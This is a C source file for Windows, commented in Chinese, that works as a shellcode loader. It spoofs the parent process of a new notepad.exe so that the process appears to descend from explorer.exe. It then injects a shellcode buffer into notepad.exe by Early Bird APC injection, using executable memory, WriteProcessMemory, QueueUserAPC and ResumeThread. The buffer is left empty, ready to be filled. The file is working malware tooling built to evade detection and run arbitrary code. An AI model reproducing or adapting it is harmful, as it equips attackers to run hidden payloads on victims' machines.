#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

// 获取目标进程pid
DWORD GetPidByName(const char * pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            if (_stricmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main(void) {  
  	unsigned char shellcode[] = "";
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // 初始化STARTUPINFOEX结构体
    STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD dwPid = 0;

    // 获取指定进程的PID
    dwPid = GetPidByName("explorer.exe");
    if (dwPid == 0)
        dwPid = GetCurrentProcessId();

    // 初始化进程线程属性列表
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // 打开指定PID的进程句柄
    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    // 更新进程线程属性，伪造父进程
    UpdateProcThreadAttribute(pAttributeList,
                                0,
                                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                &hParentProcess,
                                sizeof(HANDLE),
                                NULL,
                                NULL);

    info.lpAttributeList = pAttributeList;

    // 创建新的进程，使其具有不同的父进程
    CreateProcessA(NULL,
                    (LPSTR) "notepad.exe",
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    &info.StartupInfo,
                    &processInfo);

    // Early Bird APC注入
		LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(processInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(processInfo.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
		QueueUserAPC((PAPCFUNC)lpBaseAddress, processInfo.hThread, NULL);
		ResumeThread(processInfo.hThread);
    // 清理资源
    DeleteProcThreadAttributeList(pAttributeList);
    CloseHandle(hParentProcess);

    return 0;
}
